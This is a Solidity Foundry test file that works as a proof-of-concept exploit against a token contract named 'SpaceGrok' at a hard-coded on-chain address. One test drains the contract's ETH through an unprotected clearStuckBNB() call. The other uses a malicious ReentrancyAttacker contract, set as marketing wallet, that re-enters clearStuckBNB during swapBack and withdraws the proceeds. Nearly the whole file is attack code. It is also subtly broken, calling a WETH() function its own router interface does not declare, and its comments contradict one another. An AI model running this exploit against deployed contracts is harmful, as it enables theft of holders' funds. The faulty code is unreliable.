```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

// Minimal interface for the target contract
interface ISpaceGrok {
    function owner() external view returns (address);
    function clearStuckBNB() external;
    function updateMarketingWallet(address newWallet) external;
    function marketingWallet() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
    function swapEnabled() external view returns (bool);
    function isExcludedFromFees(address account) external view returns (bool);
    function maxTx() external view returns (uint256);
    function maxWallet() external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

// Malicious contract to act as marketingWallet and reenter clearStuckBNB
contract ReentrancyAttacker {
    ISpaceGrok target;
    address payable attacker;
    bool attackDone;

    constructor(address _target, address payable _attacker) {
        target = ISpaceGrok(_target);
        attacker = _attacker;
    }

    // Fallback: reenter clearStuckBNB to drain ETH
    receive() external payable {
        if (!attackDone) {
            attackDone = true;
            target.clearStuckBNB(); // reentrancy: drain all ETH to this contract
        }
    }

    // Allow attacker to withdraw all ETH
    function withdraw() external {
        require(msg.sender == attacker, "not attacker");
        attacker.transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    ISpaceGrok constant target = ISpaceGrok(0x58718fd4567517d9a713a1f9f3de6cbf9404e59e);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address deployer = 0x1255a2Dd54Ced55547aE826dD0C1eb6443678a38; // minter
    address owner;
    address attacker;
    ReentrancyAttacker reentrancyContract;

    function setUp() public {
        // Determine owner from on-chain
        owner = target.owner();
        attacker = address(0xBEEF);
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");
        vm.label(address(target), "SpaceGrok");
    }

    // Test 1: Direct unprotected clearStuckBNB (anyone can drain ETH)
    function testUnauthorizedClearStuckBNBDrain() public {
        // Give the contract some ETH
        deal(address(target), 10 ether);
        assertEq(address(target).balance, 10 ether);

        // Attacker calls clearStuckBNB()
        uint256 attackerBalanceBefore = address(attacker).balance;
        vm.prank(attacker);
        target.clearStuckBNB();

        // Attacker receives all ETH
        assertEq(address(attacker).balance - attackerBalanceBefore, 10 ether);
        assertEq(address(target).balance, 0);
    }

    // Test 2: Reentrancy via swapBack when marketingWallet is attacker-controlled
    function testReentrancyViaSwapBack() public {
        // Deploy malicious contract to be set as marketingWallet
        reentrancyContract = new ReentrancyAttacker(address(target), payable(attacker));

        // Owner must update the marketingWallet to the malicious contract
        vm.prank(owner);
        target.updateMarketingWallet(address(reentrancyContract));

        // Ensure the contract has some token balance (from fees) and swapEnabled
        // We can trigger a swap by buying tokens with ETH through Uniswap,
        // then selling to accumulate fees in the contract.
        // Simplified: we'll manually add liquidity and perform a swap to generate fees.
        address pair = target.uniswapV2Pair();
        vm.label(pair, "UniswapV2Pair");

        // Get some WBNB and tokens to provide liquidity (optional)
        // For simplicity, we'll exploit the current state: contract likely has tokens.
        // If not, we can mint or transfer some.
        // We'll use the minter address to transfer tokens to the contract (simulating buy fees)
        vm.prank(deployer);
        target.transfer(address(target), 1_000_000 ether); // artificially add tokens to contract

        // Now trigger a sell transaction that leads to swapBack
        // We'll send some tokens to the pair to simulate a sell, which triggers fee accumulation.
        vm.startPrank(attacker);
        // Approve Uniswap to spend tokens (attacker needs some tokens)
        // First, attacker gets tokens from deployer
        vm.stopPrank();
        vm.prank(deployer);
        target.transfer(attacker, 100_000 ether);

        // Attacker sells tokens: send to pair (simulates AMM sell)
        vm.startPrank(attacker);
        target.approve(ROUTER, 100_000 ether);
        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = IUniswapV2Router(ROUTER).WETH();
        // Use swapExactTokensForETHSupportingFeeOnTransferTokens via router
        // But we need to call the right function on router; we'll use the pair directly for simplicity.
        // Actually, to trigger the fee mechanism, we can just transfer tokens to the pair.
        // The pair's swap function will call _transfer on target.
        // But the condition `AMM[to]` is true when to is the pair.
        // So we can do a direct transfer of tokens to the pair.
        target.transfer(pair, 100_000 ether);
        vm.stopPrank();

        // During that transfer, swapBack() was called which sends ETH to marketingWallet (our contract).
        // The malicious contract's fallback will call clearStuckBNB and drain all ETH.
        // Check that the malicious contract got all ETH (or the attacker via withdraw)
        uint256 attackerBalanceBefore = attacker.balance;
        // The reentrancy should have drained all ETH from target to reentrancyContract
        // Attacker can then withdraw from reentrancyContract
        vm.prank(attacker);
        reentrancyContract.withdraw();
        uint256 attackerBalanceAfter = attacker.balance;
        // The attacker should have gained ETH
        assertGt(attackerBalanceAfter - attackerBalanceBefore, 0);
        // The target should have lost all ETH
        assertEq(address(target).balance, 0);
    }
}
```
